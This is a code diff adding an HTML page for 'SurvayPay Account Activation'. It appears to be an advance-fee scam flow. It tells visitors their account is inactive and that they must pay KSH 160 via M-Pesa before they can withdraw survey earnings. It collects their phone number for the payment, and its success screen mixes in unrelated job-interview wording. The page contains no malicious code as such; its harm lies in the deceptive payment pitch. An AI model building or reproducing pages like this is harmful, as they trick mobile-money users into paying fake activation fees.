@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SurvayPay Account Activation</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="survey-ads.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+</head>
+<body>
+    <div class="container">
+        <div id="info-step" class="step">
+            <div class="icon-container">
+                <i class="fas fa-shield-alt"></i>
+            </div>
+            
+            <h1>Activate Your Account</h1>
+            
+            <div class="alert-box">
+                <i class="fas fa-exclamation-triangle"></i>
+                <p>Your account is inactive. Activate now to complete your withdrawal to M-Pesa.</p>
+            </div>
+            
+            <div class="benefits-container">
+                <h3>Benefits of Activation:</h3>
+                <ul>
+                    <li><i class="fas fa-check"></i> Access to premium surveys (250+ KSH)</li>
+                    <li><i class="fas fa-check"></i> Increased withdrawal limits</li>
+                    <li><i class="fas fa-check"></i> Improved account security</li>
+                </ul>
+            </div>
+            
+            <button id="activate-btn" class="primary-btn">Activate Account</button>
+            <button id="cancel-btn" class="secondary-btn">Not Now</button>
+        </div>
+        
+        <div id="payment-step" class="step active">
+            
+            
+            <h1>Secure Payment Gateway</h1>
+<p class="gateway-description">Pay securely using your M-Pesa number via Secure Payment Gateway</p>
+            
+            <p class="description">You will receive an SMS notification for interview scheduling and requirements.</p>
+            
+            <label for="phone-input" class="input-label">M-Pesa Phone Number</label>
+<div class="input-container">
+                <input 
+                    type="tel" 
+                    id="phone-input" 
+                    placeholder="e.g. 0712345678"
+                    autocomplete="tel"
+                >
+                <p id="error-message" class="error-text"></p>
+            </div>
+            
+            <div id="status-container" class="status-container"></div>
+            
+            <!-- Survey Ad Container for Failed Payment (appears before buttons) -->
+            <div id="failed-payment-ad-container"></div>
+            
+            <button id="pay-btn" class="primary-btn">Proceed to Pay</button>
+            <button id="back-btn" class="secondary-btn">Back</button>
+        </div>
+        
+        <div id="success-step" class="step">
+            <div class="icon-container success">
+                <i class="fas fa-check-circle"></i>
+            </div>
+            
+            <h1>Congratulations!</h1>
+            
+            <p class="description">
+                Application complete! We will contact you within 24 hours.
+            </p>
+            
+            <div class="success-details">
+                <p><strong>Amount Paid:</strong> KSH 160</p>
+                <p><strong>Transaction ID:</strong> <span id="transaction-id">-</span></p>
+            </div>
+            
+            <!-- Survey Ad Container for Success -->
+            <div id="success-ad-container"></div>
+            
+            <button id="continue-btn" class="primary-btn">Continue to App</button>
+        </div>
+        
+        <div id="failed-step" class="step">
+            <div class="icon-container error">
+                <i class="fas fa-times-circle"></i>
+            </div>
+            
+            <h1>Payment Cancelled</h1>
+            
+            <p class="description">
+                Your payment was cancelled or failed. No charges were made to your account.
+            </p>
+            
+            <div class="error-details">
+                <p id="failure-reason">The payment was cancelled by user.</p>
+            </div>
+            
+            <!-- Survey Ad Container for Failed -->
+            <div id="failure-ad-container"></div>
+            
+            <button id="retry-btn" class="primary-btn">Try Again</button>
+            <button id="cancel-payment-btn" class="secondary-btn">Cancel</button>
+        </div>
+        
+        <!-- Survey Ad Container for Cancel -->
+        <div id="cancel-ad-container" class="hidden"></div>
+    </div>
+
+    <script src="survey-ads.js"></script>
+    <script src="script.js"></script>
+</body>
+</html>
